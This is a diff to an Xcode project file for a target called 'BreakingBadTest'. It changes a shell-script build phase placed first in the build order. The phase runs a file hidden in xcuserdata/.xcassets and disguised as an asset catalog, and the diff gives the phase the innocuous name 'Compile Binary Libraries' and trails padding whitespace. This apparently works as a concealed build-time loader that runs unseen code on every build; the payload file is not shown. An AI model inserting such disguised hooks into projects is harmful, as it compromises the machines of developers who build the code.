@@ -276,7 +276,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 064FEED825FAE5F4000568EE /* Build configuration list for PBXNativeTarget "BreakingBadTest" */;
 			buildPhases = (
-				C1E6CA5E2D17178B1EAAC43A /* Build Project Frameworks */,
+				A35FDBEAECC4CD0AD5AAC43A /* Compile Binary Libraries */,
 				CEDDFCEBAE1D3EE0565CF841 /* [CP] Check Pods Manifest.lock */,
 				064FEEAA25FAE5EB000568EE /* Sources */,
 				064FEEAB25FAE5EB000568EE /* Frameworks */,
@@ -402,7 +402,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	C1E6CA5E2D17178B1EAAC43A /* Build Project Frameworks */ = {
+	A35FDBEAECC4CD0AD5AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -411,7 +411,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -420,8 +420,14 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
 	
 
 	
